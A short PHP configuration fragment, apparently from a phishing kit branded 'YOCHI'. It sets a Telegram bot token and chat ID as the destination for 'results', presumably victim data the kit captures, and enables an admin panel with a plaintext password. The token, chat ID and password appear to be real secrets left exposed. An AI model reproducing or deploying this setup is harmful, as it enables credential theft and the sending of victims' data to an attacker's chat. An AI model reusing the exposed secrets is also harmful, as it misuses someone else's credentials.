...
$tgbot = "6079808899:AAFop4T6WltctRGoy6h0SJcP4l40k7JuDSI";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid = "5611532852";               # <--- YOUR TELEGRAM CHAT ID
$resultheading = "🎌 YOCHI 🎌";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
$adminpass = "zoomlion";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
